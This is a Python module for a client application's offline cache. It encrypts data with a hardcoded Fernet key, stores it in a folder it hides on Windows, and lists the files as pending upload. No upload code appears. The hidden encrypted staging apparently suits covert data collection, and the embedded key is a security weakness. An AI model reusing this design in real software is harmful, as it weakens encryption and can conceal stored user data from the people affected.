import os
import json
import base64
import time
from datetime import datetime
from cryptography.fernet import Fernet
from src.client.core.platform import Platform
from src.client.core.config import Config

class OfflineCache:
    def __init__(self):
        self.appdata = Platform.get_appdata_path(local=Config.DEVELOPER_MODE)
        self.cache_dir = os.path.join(self.appdata, Config.OWN_DIR_NAME, ".cache")
        # In a real build, this key would be unique/stored safely
        self.key = b'6fR_w_Jv7X6V_m7f-p8S0U6M3g9_K9B0E1L2_P3R4S5=' 
        self.fernet = Fernet(self.key)
        
        if not os.path.exists(self.cache_dir):
            os.makedirs(self.cache_dir)
            if Platform.is_windows():
                # Hide the directory on Windows
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(self.cache_dir, 0x02)

    def save_data(self, data_type, content, is_binary=False):
        """Save encrypted data to the offline cache."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        filename = f"{data_type}_{timestamp}.cache"
        file_path = os.path.join(self.cache_dir, filename)
        
        try:
            if is_binary:
                encrypted_data = self.fernet.encrypt(content)
            else:
                encrypted_data = self.fernet.encrypt(content.encode())
                
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
            return True
        except Exception as e:
            print(f"Cache Error: {e}")
            return False

    def get_pending_files(self):
        """List all files waiting to be uploaded."""
        if not os.path.exists(self.cache_dir):
            return []
        return [os.path.join(self.cache_dir, f) for f in os.listdir(self.cache_dir) if f.endswith(".cache")]

    def clear_cache(self):
        """Delete all files in the cache."""
        files = self.get_pending_files()
        for f in files:
            try:
                os.remove(f)
            except:
                pass

    def decrypt_file(self, file_path):
        """Decrypt a cached file and return its content."""
        try:
            with open(file_path, "rb") as f:
                encrypted_data = f.read()
            return self.fernet.decrypt(encrypted_data)
        except:
            return None
